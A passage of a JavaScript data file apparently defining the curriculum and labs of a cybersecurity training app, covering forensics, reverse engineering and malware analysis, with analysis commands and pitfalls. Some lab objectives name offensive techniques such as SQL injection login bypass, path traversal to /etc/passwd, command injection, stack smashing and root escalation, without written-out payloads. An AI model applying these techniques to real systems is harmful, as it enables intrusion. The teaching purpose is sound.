// SANCTION - Curriculum & Lab Datasets
export const TRACKS = {
  DF: { name: 'Digital Forensics', accent: 'var(--amber)' },
  RE: { name: 'Reverse Engineering', accent: 'var(--volt)' },
  MA: { name: 'Malware Analysis', accent: 'var(--blood)' }
};

export const PHASES = [
  {
    n: 1,
    id: 'disk',
    title: 'Disk & File Systems',
    tracks: ['DF'],
    tag: 'MBR · GPT · NTFS/ext4 · inodes · raw hex',
    idea: `Storage is just <b>bytes</b>. A file system is the agreed map saying which bytes belong to which file — and forensics lives <i>below</i> that map, where deleted and hidden data still sit.`,
    deep: `Deleting a file flips one flag and frees some blocks — it never wipes them. Until they're reused, the whole file is still sitting there in raw bytes, on NTFS or ext4 alike.`,
    concepts: [
      { t: `Read the boot signature`, d: `Open the Disk lab, parse the partition table, and read the two bytes at 0x1FE. What must they hold for a BIOS to treat this sector as bootable?` },
      { t: `Decode a partition type byte`, d: `Partition #1's type byte is 0x07. Look it up in the table and name the filesystem it points to.` },
      { t: `Read a start LBA off the table`, d: `Partition #1's 4-byte little-endian start LBA sits at offset +8 in its 16-byte entry. Read it straight off the parsed table.` },
      { t: `Carve a file by magic bytes alone`, d: `Carve the bytes at offset 0x20 and identify the file type from its magic number — no filesystem lookup needed.` },
      { t: `Cross-check with the real tool`, d: `In range/disk, run mmls disk.img and fls -o 2048 disk.img. Confirm the start LBA matches what you read by hand, then recover the deleted file with icat.` }
    ],
    commands: [
      { c: `xxd file | head`, d: `raw hex + ASCII of the first bytes (magic check)` },
      { c: `fdisk -l disk.img`, d: `list the partition table` },
      { c: `mmls disk.img`, d: `Sleuth Kit partition layout` },
      { c: `fls -r -m / disk.img`, d: `recursive file listing → timeline body` },
      { c: `istat disk.img 12345`, d: `inode / MFT-record detail for one file` },
      { c: `photorec disk.img`, d: `signature-based file carving` }
    ],
    traps: [
      `Mounting a live disk read-write before imaging — it alters timestamps and can overwrite freed space.`,
      `Trusting one timestamp field — corroborate $SI against $FN and the USN journal.`,
      `Ignoring slack space — the tail of a file's last cluster can hold a previous file's leftovers.`
    ],
    feeds: `Feeds Phase 8 (the same structures, now in RAM) and Phase 11 (MFT/registry artifacts).`
  },
  {
    n: 2,
    id: 'asm',
    title: 'x86 / x64 Assembly',
    tracks: ['RE'],
    tag: 'registers · stack frames · calling conventions',
    idea: `Every program — any source language — becomes machine instructions over <b>registers and memory</b>. Reverse engineering is reading that lowest layer fluently.`,
    deep: `A function call is: load args into registers, \`call\` pushes the return address and jumps, a prologue anchors a stack frame. See that shape once and you can read any binary's control flow.`,
    concepts: [
      { t: `Single-step a real routine`, d: `Open the Assembly lab and step through its 7 instructions one at a time, watching rax build up.` },
      { t: `Predict before you run`, d: `Before hitting "Run to end," compute by hand what rax should hold: 5+3, squared, minus 4. Then check yourself.` },
      { t: `Answer the calling-convention questions from memory`, d: `Don't guess — you should already know rdi holds arg1 and rax holds the return value before you click an option.` },
      { t: `Decode a little-endian integer by hand`, d: `Given the bytes 01 00 00 00, work out the 32-bit value they encode before you next open a hex dump.` },
      { t: `Confirm it in a real debugger`, d: `In range/asm, run gdb ./trace, break compute, run, then stepi through it and check info registers rax matches the lab.` }
    ],
    commands: [
      { c: `objdump -d -M intel bin`, d: `disassemble in Intel syntax` },
      { c: `gdb -q ./bin`, d: `then: disas main, layout asm` },
      { c: `info registers`, d: `(gdb) dump all register values` },
      { c: `x/20i $rip`, d: `(gdb) show the next 20 instructions` },
      { c: `ndisasm -b64 shellcode.bin`, d: `flat disassembly of raw bytes` }
    ],
    traps: [
      `Forgetting little-endian when reading hex dumps of integers or addresses.`,
      `Treating eax as a separate register — it's just the low 32 bits of rax.`,
      `Assuming every argument is on the stack — x64 passes the first several in registers.`
    ],
    feeds: `Feeds every later phase — Ghidra (5), unpacking (7), and shellcode you pull from memory (8) all bottom out here.`
  },
  {
    n: 3,
    id: 'binfmt',
    title: 'PE & ELF Binary Format',
    tracks: ['RE', 'MA'],
    tag: 'headers · sections · imports · entropy',
    idea: `An executable is a <b>structured container</b> telling the loader how to map code/data into memory and wire up imports. Packing, injection, and imports all live in this format.`,
    deep: `The loader only reads program headers/segments; sections are for humans and linkers. The IAT/GOT is the seam between "the binary" and "the system" — and exactly what breaks when you dump a packed process from memory.`,
    concepts: [
      { t: `Identify a format from its first bytes`, d: `Open the Binfmt lab's ELF tab. Read the magic at 0x00 and the class/endianness bytes at 0x04-0x05 without looking at the label.` },
      { t: `Find the entry point in both formats`, d: `Locate e_entry (ELF) and AddressOfEntryPoint (PE) in both tabs and submit both as findings.` },
      { t: `Pick segments over sections for loading`, d: `Answer which one the OS loader actually reads to map the binary into memory — get this reflexive.` },
      { t: `Spot packing from name + entropy alone`, d: `Given a section named UPX1 at entropy 7.9, decide what that combination signals before you ever touch a real sample.` },
      { t: `Confirm it on a real binary`, d: `In range/crackmes, run readelf -h crackme1 and readelf -S crackme1 — find the same e_entry and section table you just read by hand.` }
    ],
    commands: [
      { c: `readelf -a ./bin`, d: `full ELF header / segments / sections` },
      { c: `objdump -h ./bin`, d: `section headers and sizes` },
      { c: `rabin2 -I ./bin`, d: `binary identity + properties` },
      { c: `rabin2 -i ./bin`, d: `imports (the IAT/GOT picture)` },
      { c: `ent section.bin`, d: `measure entropy of a blob` }
    ],
    traps: [
      `Reading sections when the loader actually uses segments (or vice versa).`,
      `Assuming a small on-disk size means small in memory — packed images expand at load.`,
      `Confusing an RVA with a raw file offset when navigating a PE by hand.`
    ],
    feeds: `Feeds static analysis (4), Ghidra typing (5), and is the map you fix when unpacking (7).`
  },
  {
    n: 4,
    id: 'static',
    title: 'Static Malware Analysis',
    tracks: ['MA'],
    tag: 'strings · YARA · packing detection · hashing',
    idea: `Learn everything you can <b>without running it</b> — identity, capability, indicators — fast and safe. Packing is the wall that eventually forces you into dynamic analysis.`,
    deep: `Static analysis is hypothesis generation without running anything — each tool either answers a question or tells you to escalate. Empty strings isn't a dead end, it's a signal to reach for FLOSS.`,
    concepts: [
      { t: `Run the triage loop in order`, d: `In the Static lab, run strings, then floss, then sha256+VT, then entropy — in that order — and watch each one either answer or redirect you.` },
      { t: `Notice when strings comes up empty`, d: `When plain strings shows nothing but garbage, that itself is the finding: escalate to FLOSS immediately, don't shrug and move on.` },
      { t: `Build a YARA rule that only matches this sample`, d: `Pick match strings for the rule, avoiding generic ones like "DOS mode" or "UPX" — confirm your rule fires with 0 false positives.` },
      { t: `Pull the C2 out of deobfuscated strings`, d: `Find the URL FLOSS recovers that plain strings missed, and submit it as your finding.` },
      { t: `Do it on a real packed sample`, d: `In range/malware, run strings packed.exe, then upx -d packed.exe -o unpacked.exe, and diff what strings shows before and after.` }
    ],
    commands: [
      { c: `sha256sum sample`, d: `identity hash for lookup` },
      { c: `strings -a -el sample`, d: `ASCII (-a) and 16-bit Unicode (-el) strings` },
      { c: `yara rules.yar sample`, d: `run signature rules` },
      { c: `capa sample`, d: `detect capabilities → ATT&CK/MBC` },
      { c: `floss sample`, d: `recover obfuscated/stack-built strings` },
      { c: `ssdeep -b sample`, d: `fuzzy hash for clustering` }
    ],
    traps: [
      `Treating clean strings output as proof of safety — packing hides the interesting ones.`,
      `Quoting a YARA hit as "it does X" when the rule only matched a string.`,
      `Skipping provenance — an IOC you can't trace back is hard to defend later.`
    ],
    feeds: `Feeds dynamic analysis (6) — static recon forms the hypothesis you then confirm by detonation.`
  },
  {
    n: 5,
    id: 'ghidra',
    title: 'Ghidra & Disassembly',
    tracks: ['RE'],
    tag: 'decompiler · P-code · xrefs · struct recovery',
    idea: `Ghidra turns machine code into readable assembly and pseudo-C so you can understand logic at scale.`,
    deep: `The decompiler is a heuristic model, not ground truth. When it shows *(undefined4*)(p+8), define the struct and every access snaps into a named field.`,
    concepts: [
      { t: `Read pseudo-C past the noise`, d: `Open the Ghidra lab. Read FUN_00401500 line by line and work out what it actually does before picking an answer.` },
      { t: `Recover a struct from offset accesses`, d: `Given three raw offset reads into the same pointer, reconstruct the struct layout that explains all three at once.` },
      { t: `Follow an xref to find the caller`, d: `Given a one-path call chain (main → decode_config → FUN_00401500), answer which function directly calls the one you're reading.` },
      { t: `Rename before you reason`, d: `Mentally rename FUN_00401500 to something like xor_decrypt before answering — naming forces you to commit to an interpretation instead of staying vague.` },
      { t: `Do it in real Ghidra`, d: `Compile range/malware/sample.c, load it into Ghidra or radare2, find the equivalent routine, and retype its parameter yourself.` }
    ],
    commands: [
      { c: `ghidraRun`, d: `launch GUI; import → auto-analyze` },
      { c: `analyzeHeadless proj X -import bin`, d: `scriptable, no-GUI analysis` },
      { c: `objdump -d -j .text bin`, d: `quick disasm without a project` },
      { c: `r2 -A bin ; pdf @ main`, d: `radare2 analyze + print main` }
    ],
    traps: [
      `Believing the decompiler literally — it's a model; check the listing when it matters.`,
      `Not renaming or typing as you go, so you re-derive the same logic twice.`,
      `Missing indirect or computed calls that static analysis can't resolve — flag them for dynamic.`
    ],
    feeds: `Feeds unpacking (7 — analyse the dumped OEP code) and protocol RE (10 — locate the crypto/send routines).`
  },
  {
    n: 6,
    id: 'dynamic',
    title: 'Dynamic Malware Analysis',
    tracks: ['MA'],
    tag: 'API hooks · syscalls · sandbox · behavioral sigs',
    idea: `Watch it run in a <b>sealed lab</b>. Every meaningful action crosses the kernel boundary as a syscall — and the program can't lie to the kernel about what it asks it to do.`,
    deep: `The kernel boundary can't be lied to — every file, network, and process action becomes a syscall. A sample that "does nothing" is usually just waiting for a precondition you haven't met yet.`,
    concepts: [
      { t: `Read a real API trace top to bottom`, d: `Open the Dynamic lab and read the full 11-call trace before filtering anything — get the shape of the whole run first.` },
      { t: `Filter for the persistence write`, d: `Filter the trace for "Reg" and name the exact mechanism it used to survive a reboot.` },
      { t: `Spot the injection triplet`, d: `Find the three-call sequence — VirtualAllocEx, WriteProcessMemory, CreateRemoteThread — and name the technique it spells out.` },
      { t: `Pull the C2 endpoint straight from the trace`, d: `Find the DNS query and the connect() call and submit the actual C2 host.` },
      { t: `Watch it for real in an isolated VM`, d: `In a real, network-isolated detonation, run strace -f -e trace=file,network,process ./sample and match each syscall category to what you found in the lab.` }
    ],
    commands: [
      { c: `strace -f -e trace=file,network,process -o run.log ./s`, d: `syscall capture, follow forks` },
      { c: `ltrace ./s`, d: `library-call trace (dynamic binaries)` },
      { c: `sudo tcpdump -i any -w run.pcap`, d: `capture C2 traffic in the lab` },
      { c: `inotifywait -mr ~/bait`, d: `live filesystem events` },
      { c: `virsh snapshot-revert hermes clean`, d: `roll the VM back to clean` }
    ],
    traps: [
      `Detonating without a snapshot first, contaminating your clean baseline.`,
      `Giving the sample real internet access instead of simulating services.`,
      `Calling a dormant sample benign instead of finding the unmet precondition.`
    ],
    feeds: `Feeds unpacking (7 — find OEP at runtime), memory (8 — same process in RAM), network (9 — that pcap).`
  },
  {
    n: 7,
    id: 'unpack',
    title: 'Unpacking & Binary Patching',
    tracks: ['MA', 'RE'],
    tag: 'OEP hunting · IAT fix · NOP patching',
    idea: `The file on disk is <b>never what runs</b>. The stub unwraps the real code in memory and jumps to the Original Entry Point — be standing there with a dump in hand.`,
    deep: `The packer's stub decrypts the real code into memory, then makes one tail jump to it. Dump a moment too early and you get ciphertext — the whole game is standing exactly at that jump.`,
    concepts: [
      { t: `Step to the tail jump, not past it`, d: `Open the Unpack lab and step the packer stub instruction by instruction until you reach the jmp into the OEP region — no further.` },
      { t: `Dump at the right instant`, d: `Try dumping before you reach the tail jump and see it fail, then dump again once you're standing on it.` },
      { t: `Explain why the IAT breaks`, d: `After dumping, answer why the import table is unusable — tie it back to when the loader normally resolves those addresses.` },
      { t: `Choose NOP vs jump-inversion correctly`, d: `Given a license check with a conditional jump, decide whether to NOP it out or invert it, and explain why those are different tools.` },
      { t: `Unpack something real`, d: `In range/malware, run upx -d packed.exe -o out.exe and compare ent entropy before and after — that ~7.9-to-normal drop is the same tail-jump moment you just found by hand.` }
    ],
    commands: [
      { c: `upx -d packed -o out`, d: `trivial UPX unpack (the easy case)` },
      { c: `ent packed ; ent original`, d: `see the entropy jump from packing` },
      { c: `(gdb) hbreak *0xADDR`, d: `hardware breakpoint near the tail jump` },
      { c: `(gdb) dump memory oep.bin $s $e`, d: `dump the unpacked region` },
      { c: `x64dbg + Scylla`, d: `(Windows) dump at OEP + rebuild IAT` }
    ],
    traps: [
      `Software breakpoints tripping anti-tamper checks — prefer hardware breakpoints.`,
      `Dumping before the tail jump completes, capturing an incomplete payload.`,
      `Stopping at "it dumped" without rebuilding imports so it actually loads.`
    ],
    feeds: `Feeds memory forensics (8 — same dump-from-RAM instinct) and protocol RE (10 — analyse the unpacked payload).`
  },
  {
    n: 8,
    id: 'memory',
    title: 'Memory Forensics',
    tracks: ['DF'],
    tag: 'EPROCESS · VAD trees · injected shellcode',
    idea: `Disk lies; <b>RAM</b> doesn't. Fileless and packed malware sits fully decrypted in memory while it runs. Kernel structures turn raw bytes into "here are the processes."`,
    deep: `Every Volatility plugin is really a structured walk of kernel objects. The instinct is never "does this list look clean" — it's "do the lists that should agree, actually agree?"`,
    concepts: [
      { t: `Diff pslist against psscan yourself`, d: `Open the Memory Forensics lab, run both plugins, and find the one PID that appears in psscan but not pslist.` },
      { t: `Explain the mismatch in one sentence`, d: `State why DKOM can fool pslist but can't fool psscan — you should be able to say this without looking it up.` },
      { t: `Find the RWX private region`, d: `Run vadinfo on the hidden PID and identify what makes that memory region suspicious.` },
      { t: `Read injected shellcode`, d: `Disassemble the flagged address and recognize the shellcode prologue pattern.` },
      { t: `Run the real plugins`, d: `On range/memory/memory-sample.raw, run the Volatility pslist and psscan plugins and reproduce the same cross-view diff for real.` }
    ],
    commands: [
      { c: `vol -f mem.raw windows.info`, d: `identify the image / build` },
      { c: `vol -f mem.raw windows.pslist`, d: `processes via the active list` },
      { c: `vol -f mem.raw windows.psscan`, d: `processes via pool scan (catches hidden)` },
      { c: `vol -f mem.raw windows.malfind`, d: `find injected RX private memory` },
      { c: `vol -f mem.raw windows.netscan`, d: `recover network connections` },
      { c: `vol -f mem.raw windows.cmdline`, d: `full command lines per process` }
    ],
    traps: [
      `Trusting pslist alone — always cross-view with psscan before calling a host clean.`,
      `Flagging every malfind hit as malicious — JIT/.NET also allocate RWX private memory.`,
      `Capturing memory after a reboot — the volatile evidence is already gone by then.`
    ],
    feeds: `Feeds rootkit detection (11 — same cross-view) and the capstone (12 — RAM is one pivot of many).`
  },
  {
    n: 9,
    id: 'network',
    title: 'Network Forensics',
    tracks: ['DF'],
    tag: 'PCAP · C2 beaconing · JA3 · DNS tunneling',
    idea: `Malware has to <b>talk</b> to get paid. Bytes on the wire are ground truth even when the code is obfuscated and memory is wiped — the skill is hearing the heartbeat in the noise.`,
    deep: `A single packet is rarely interesting — the pattern is. Beaconing is periodicity, JA3 is a handshake fingerprint, tunneling is a volume/entropy anomaly. Encryption removes payload, not metadata.`,
    concepts: [
      { t: `Find the beacon by timing, not content`, d: `Open the Network lab and run the beacon analysis — read the inter-arrival deltas, not the payload, to name the C2 host.` },
      { t: `Measure the interval`, d: `Average the deltas you just saw and submit the beacon period in seconds.` },
      { t: `Fingerprint the TLS client`, d: `Run the JA3 lookup and note what a match actually proves versus what it doesn't.` },
      { t: `Carve the transferred payload`, d: `Reassemble the HTTP body and identify the file type purely from its magic bytes.` },
      { t: `Do it in Wireshark for real`, d: `Open range/network/capture.pcap, use Statistics → Conversations to find the same beaconing host, then Follow Stream to pull the same payload.` }
    ],
    commands: [
      { c: `tshark -r cap.pcap -q -z conv,ip`, d: `IP conversation summary` },
      { c: `tshark -r cap.pcap -Y "http.request"`, d: `filter HTTP requests` },
      { c: `zeek -r cap.pcap`, d: `generate conn/dns/ssl protocol logs` },
      { c: `suricata -r cap.pcap -S rules`, d: `run IDS signatures over a pcap` },
      { c: `Wireshark: Export Objects → HTTP`, d: `carve transferred files` }
    ],
    traps: [
      `Scrolling packets one by one instead of starting from summaries.`,
      `Assuming encrypted means invisible — timing and handshake metadata still talk.`,
      `Flagging any periodic traffic as C2 without ruling out legitimate update checks.`
    ],
    feeds: `Feeds protocol RE (10 — pair these bytes with the code) and the capstone (12 — the C2 timeline).`
  },
  {
    n: 10,
    id: 'protocol',
    title: 'Protocol RE & C2 Analysis',
    tracks: ['RE', 'MA'],
    tag: 'custom binary protocols · Frida · PCAP+bin',
    idea: `When malware speaks its own language, you <b>reverse the dictionary</b> — pairing wire bytes with the code that wrote them until you can read, and even speak, the protocol.`,
    deep: `A captured packet is meaningless until you find the function that built it. Hook the encrypt-before-send routine and you get plaintext and key for free — no cipher-breaking required.`,
    concepts: [
      { t: `Find the frame boundary`, d: `Open the Protocol lab, auto-frame the raw byte stream, and identify the two magic bytes that start every message.` },
      { t: `Read the length field correctly`, d: `Work out the framing — magic, 2-byte little-endian length, opcode, payload — and get the byte offsets right.` },
      { t: `Recover the XOR key`, d: `Decode the payloads with different key guesses until the operator commands become readable text.` },
      { t: `Name the opcodes`, d: `Map each decoded opcode (1, 2, 3) to what kind of message it represents — beacon, exec, exfil.` },
      { t: `Hook the real routine`, d: `On a real sample, run frida-trace -i "send" -p PID and read the buffer just before it hits the socket — the same plaintext-before-encryption vantage point.` }
    ],
    commands: [
      { c: `frida-trace -i "send" -p PID`, d: `auto-hook send() and log buffers` },
      { c: `Interceptor.attach(addr,{onEnter(a){…}})`, d: `hook a function, read its args` },
      { c: `frida -l hook.js -f ./sample`, d: `spawn + instrument a sample` },
      { c: `python decode_c2.py cap.bin`, d: `your own frame parser/decryptor` }
    ],
    traps: [
      `Guessing the frame structure when the binary states it exactly.`,
      `Modeling only the frame format and ignoring handshake/session state.`,
      `Running active replay against anything reachable outside your lab.`
    ],
    feeds: `Feeds the capstone (12 — decode the operator's commands and turn them into detections).`
  },
  {
    n: 11,
    id: 'rootkit',
    title: 'Rootkits & Forensic Artifacts',
    tracks: ['MA', 'DF'],
    tag: 'DKOM · MFT · registry · event logs',
    idea: `A rootkit's job is to make you look in the <b>wrong place</b>. The counter is cross-view: no rootkit lies consistently <i>everywhere</i>, so triangulate sources that should agree.`,
    deep: `A rootkit can corrupt one source of truth but not all of them — the system keeps overlapping, independently-updated records. The contradiction between sources that should agree is the fingerprint.`,
    concepts: [
      { t: `Spot a forged Run key`, d: `Open the Rootkit lab's registry tab and explain why "WindowsUpdate" pointing at C:\\Temp\\svc.exe is not a real Windows entry.` },
      { t: `Catch a timestomp by comparing two fields`, d: `Compare $STANDARD_INFORMATION against $FILE_NAME on the same MFT record and explain which one the attacker actually edited.` },
      { t: `Read a service-install event`, d: `Find event 7045 and pull the malicious service name straight out of it.` },
      { t: `Recognize a hooked SSDT entry`, d: `Given a kernel function pointer that resolves outside ntoskrnl's address range, explain what that redirect means.` },
      { t: `Parse a real MFT`, d: `Run MFTECmd against a real image and look for the same $SI/$FN disagreement you just found by hand.` }
    ],
    commands: [
      { c: `vol -f mem.raw windows.psscan`, d: `cross-view vs pslist for DKOM` },
      { c: `MFTECmd -f $MFT --csv .`, d: `parse MFT (find $SI/$FN mismatch)` },
      { c: `EvtxECmd -d C:\\evtx --csv .`, d: `parse Windows event logs` },
      { c: `AppCompatCacheParser / AmcacheParser`, d: `execution evidence from registry` },
      { c: `log2timeline.py out.plaso image`, d: `build a super-timeline` }
    ],
    traps: [
      `Trusting any single source the attacker could touch — triangulate across sources.`,
      `Reading only the editable $SI field and missing the kernel-set $FN.`,
      `Treating an empty log as "nothing happened" instead of checking for a 1102 clear.`
    ],
    feeds: `Feeds the capstone (12 — artifacts + timeline are the spine of the final reconstruction).`
  },
  {
    n: 12,
    id: 'capstone',
    title: 'Full Investigation Scenario',
    tracks: ['DF', 'RE', 'MA'],
    tag: 'end-to-end attack reconstruction',
    idea: `The <b>orchestra</b>. No single source tells the story — you pivot disk↔memory↔network↔binary, each finding raising the next question.`,
    deep: `No single source tells the whole story. You hold one IOC and walk it across disk, memory, network, and binary until each pivot answers the next question.`,
    concepts: [
      { t: `Chase one IOC across every stage`, d: `Open the Capstone lab and work through all four stages — notice how each answer becomes the input to the next question.` },
      { t: `Name the initial access vector from the artifact alone`, d: `Given only the attachment name, identify how the intrusion actually started.` },
      { t: `Identify the execution technique`, d: `From the process lineage in stage 2, name what actually ran the payload.` },
      { t: `Pull the C2 from a beacon pattern`, d: `From the timing description alone, extract the C2 IP address.` },
      { t: `Call the final impact`, d: `From the file-encryption behavior in stage 4, name the attacker's objective.` },
      { t: `Write it up like a real case`, d: `For a case you've worked in this app, write the one-sentence executive summary and one Sigma/YARA/Suricata rule you'd ship from it.` }
    ],
    commands: [
      { c: `log2timeline.py + psort.py`, d: `build and filter the super-timeline` },
      { c: `vol … pslist|psscan|malfind|netscan`, d: `memory pivot` },
      { c: `tshark / zeek / suricata`, d: `network pivot` },
      { c: `MFTECmd / EvtxECmd / RegistryExplorer`, d: `disk-artifact pivot` },
      { c: `write: Sigma + Suricata + YARA`, d: `turn findings into deployable detections` }
    ],
    traps: [
      `Running every tool instead of pivoting on a specific hypothesis.`,
      `Making claims without citing which artifact backs them.`,
      `Forcing one tidy story when the evidence honestly supports two.`
    ],
    feeds: `This is the synthesis of Phases 1–12 — and the template for real casework and your portfolio.`
  }
];

export const LABS = [
  { id: 'mem', track: 'DF', name: 'Memory Triage', tool: 'volatility-style shell', blurb: 'A 4GB RAM image with an injected process hiding in plain sight. Pull the process list, find where it calls home, decode what it stole.' },
  { id: 're', track: 'RE', name: 'RE Bench', tool: 'disassembler / decompiler', blurb: 'Three crackmes with live disassembly + pseudo-C side by side. Read the check and recover the key — or patch the jump and walk through.' },
  { id: 'pcap', track: 'DF', name: 'DNS Exfil Hunt', tool: 'packet analyzer', blurb: 'A capture where data is leaking through DNS subdomains. Filter the noise, inspect packets, reassemble the smuggled bytes.' },
  { id: 'log', track: 'DF', name: 'Log Triage', tool: 'log hunting', blurb: 'auth.log + access.log straight off a breached box. grep out the brute force, the account that fell, and the web shell they dropped.' },
  { id: 'crypto', track: 'CR', name: 'Crypto Workbench', tool: 'cipher / encoding', blurb: 'Stack decode operations — Caesar, Base64, single-byte XOR, reverse — until a flag drops out. A CyberChef in miniature.' },
  { id: 'web', track: 'WEB', name: 'Web Exploitation', tool: 'appsec sandbox', blurb: 'Hands-on SQLi login bypass, path traversal, OS command injection and reflected XSS against safe simulated endpoints.' },
  { id: 'pe', track: 'MA', name: 'PE Static Triage', tool: 'malware static', blurb: 'Dissect a packed Windows binary: sections, entropy, imports, strings. Spot the packer, the injection APIs, the C2 — then write a YARA rule.' },
  { id: 'stego', track: 'DF', name: 'Stego & Carving', tool: 'hidden data', blurb: 'Three ways data hides in a file: appended after EOF, buried in metadata, and spread across pixel LSBs. Carve each one out.' },
  { id: 'pwn', track: 'PWN', name: 'Stack Overflow', tool: 'binary exploitation', blurb: 'A textbook buffer overflow with a live stack diagram. Find the offset, smash the saved return address, redirect to win().' },
  { id: 'privesc', track: 'SYS', name: 'Linux Privesc', tool: 'post-exploitation', blurb: 'You landed a www-data shell. Enumerate sudo, SUID and cron, find the misconfiguration, escalate to root.' },
  { id: 'hash', track: 'CR', name: 'Hash Cracking', tool: 'password audit', blurb: 'Identify hash algorithms by shape, crack an unsalted hash with a wordlist, and see exactly why salting defeats you.' },
  { id: 'email', track: 'MA', name: 'Phishing Triage', tool: 'email forensics', blurb: 'Read raw headers — SPF/DKIM/DMARC, a lookalike sender, a defanged URL, a base64 attachment — and call the phish.' },
  { id: 'intel', track: 'INT', name: 'Threat Intel', tool: 'IOC · MITRE ATT&CK', blurb: 'Pull IOCs from an incident and map attacker behaviour to MITRE ATT&CK techniques — the analyst’s daily reps.' },
  { id: 'disk', track: 'DF', group: 'chapter', phase: 1, name: 'Disk & File Systems', tool: 'MBR · partitions · carving', blurb: 'Parse a raw 512-byte boot sector by hand: partition table, FS type, start LBA, the 55AA signature — then carve a file by magic bytes.' },
  { id: 'asm', track: 'RE', group: 'chapter', phase: 2, name: 'x86 / x64 Assembly', tool: 'register tracer', blurb: 'Single-step a short x64 routine, watch the registers change, and work out what it returns — plus the calling convention.' },
  { id: 'binfmt', track: 'RE', group: 'chapter', phase: 3, name: 'PE & ELF Formats', tool: 'header anatomy', blurb: 'Decode ELF and PE headers field by field: magic, class, entry point, sections vs segments, GOT/PLT.' },
  { id: 'static', track: 'MA', group: 'chapter', phase: 4, name: 'Static Analysis', tool: 'strings · hash · YARA', blurb: 'Run the static triage loop: strings → FLOSS, hash → VT, entropy → packing, then write a YARA rule that fires only on this sample.' },
  { id: 'ghidra', track: 'RE', group: 'chapter', phase: 5, name: 'Ghidra & Decompiler', tool: 'pseudo-C · structs · xrefs', blurb: 'Read decompiler output: deduce what a function does, recover a struct from offset accesses, and follow a cross-reference.' },
  { id: 'dynamic', track: 'MA', group: 'chapter', phase: 6, name: 'Dynamic Analysis', tool: 'API / behavior trace', blurb: 'Detonate a sample and read the behavioral trace — spot persistence, process injection, C2 and the encryption payload.' },
  { id: 'unpack', track: 'MA', group: 'chapter', phase: 7, name: 'Unpacking & Patching', tool: 'OEP · IAT · NOP patch', blurb: 'Step a packer stub to the tail jump, find the OEP, dump, reason about the IAT, and NOP a check.' },
  { id: 'memory', track: 'DF', group: 'chapter', phase: 8, name: 'Memory Forensics', tool: 'EPROCESS · VAD · shellcode', blurb: 'Catch a DKOM-unlinked process by diffing pslist vs psscan, find its RWX VAD, and disassemble the injected shellcode.' },
  { id: 'network', track: 'DF', group: 'chapter', phase: 9, name: 'Network Forensics', tool: 'beaconing · JA3 · carving', blurb: 'Find the C2 in a flow table by its beacon periodicity, match a malicious JA3, and carve a transferred executable.' },
  { id: 'protocol', track: 'RE', group: 'chapter', phase: 10, name: 'Protocol RE & C2', tool: 'binary protocol parsing', blurb: 'Reverse a custom C2 protocol from a raw byte stream: find the magic, the framing, the XOR key, and decode the commands.' },
  { id: 'rootkit', track: 'MA', group: 'chapter', phase: 11, name: 'Rootkits & Artifacts', tool: 'registry · MFT · evtx · hooks', blurb: 'Hunt persistence in a Run key, catch timestomping via $SI/$FN mismatch, find a 7045 service install, and spot an SSDT hook.' },
  { id: 'capstone', track: 'DF', group: 'chapter', phase: 12, name: 'Full Investigation', tool: 'end-to-end reconstruction', blurb: 'Chain it all: phishing → execution → C2 → impact. Make the call at each stage to reconstruct the whole intrusion.' }
];

export const LABOBJ = {
  mem: [
    { k: 'malpid', t: 'Name the masquerading / injected process (by PID)' },
    { k: 'c2', t: 'Identify the C2 server (ip:port)' },
    { k: 'ps', t: 'Decode the encoded PowerShell payload (terminal: decode)' },
    { k: 'flag', t: 'Recover the hidden flag' }
  ],
  re: [
    { k: 'l0', t: 'Solve crackme #1 — plaintext compare' },
    { k: 'l1', t: 'Solve crackme #2 — XOR gate' },
    { k: 'l2', t: 'Solve crackme #3 — forge a valid serial' },
    { k: 'patch', t: 'Bypass a check by patching its conditional jump' }
  ],
  pcap: [
    { k: 'dom', t: 'Identify the exfiltration domain' },
    { k: 'victim', t: 'Identify the victim host (IP)' },
    { k: 'count', t: 'Count the exfil DNS queries' },
    { k: 'flag', t: 'Reassemble & decode the leaked data' }
  ],
  log: [
    { k: 'ip', t: 'Find the attacker IP (SSH brute force)' },
    { k: 'acct', t: 'Find the account they compromised' },
    { k: 'shell', t: 'Find the uploaded web shell path' },
    { k: 'cmd', t: 'Find a command run through the web shell' }
  ],
  crypto: [
    { k: 'rot',  t: 'Solve the Caesar / ROT challenge' },
    { k: 'b64',  t: 'Solve the Base64 (×2) challenge' },
    { k: 'xor',  t: 'Solve the single-byte XOR challenge' },
    { k: 'rev',  t: 'Solve the reverse challenge' },
    { k: 'rail', t: 'Solve the Rail Fence cipher (r=3)' },
    { k: 'vig',  t: 'Solve the Vigenère cipher' },
  ],
  web: [
    { k: 'sqli', t: 'Bypass the login with SQL injection' },
    { k: 'lfi', t: 'Read /etc/passwd via path traversal' },
    { k: 'cmdi', t: 'Run a command via OS command injection' },
    { k: 'xss', t: 'Fire script via reflected XSS' }
  ],
  pe: [
    { k: 'packed', t: 'Identify that the sample is packed' },
    { k: 'imports', t: 'Name a code-injection import' },
    { k: 'c2', t: 'Find the hardcoded C2 domain' },
    { k: 'yara', t: 'Write a YARA rule with no false positives' }
  ],
  stego: [
    { k: 'append', t: 'Carve data appended after the JPEG EOF' },
    { k: 'meta', t: 'Find the flag hidden in metadata' },
    { k: 'lsb', t: 'Extract the LSB-encoded flag' }
  ],
  pwn: [
    { k: 'offset', t: 'Find the offset to the saved return address' },
    { k: 'redirect', t: 'Redirect execution to win()' },
    { k: 'canary', t: 'Explain what a stack canary changes' }
  ],
  privesc: [
    { k: 'sudol', t: 'Enumerate sudo rights (sudo -l)' },
    { k: 'suid', t: 'List SUID binaries' },
    { k: 'cron', t: 'Find the writable root cron job' },
    { k: 'root', t: 'Escalate to root' }
  ],
  hash: [
    { k: 'idtype', t: 'Identify every hash type correctly' },
    { k: 'crack', t: 'Crack the unsalted hash' },
    { k: 'salt', t: 'See why salting breaks the attack' }
  ],
  email: [
    { k: 'spf', t: 'Spot the SPF / authentication failure' },
    { k: 'spoof', t: 'Identify the lookalike sender domain' },
    { k: 'url', t: 'Extract the phishing URL' },
    { k: 'payload', t: 'Decode the attachment payload' }
  ],
  intel: [
    { k: 'iocs', t: 'Classify every IOC correctly' },
    { k: 'attack', t: 'Map all behaviours to MITRE ATT&CK' }
  ],
  disk: [
    { k: 'sig', t: 'Find the boot signature' },
    { k: 'fstype', t: 'Identify partition 1 file system' },
    { k: 'lba', t: 'Read partition 1 start LBA' },
    { k: 'carve', t: 'Identify the carved file by its magic' }
  ],
  asm: [
    { k: 'ret', t: 'Compute what the routine returns' },
    { k: 'argreg', t: 'Name the 1st integer-argument register' },
    { k: 'retreg', t: 'Name the return-value register' }
  ],
  binfmt: [
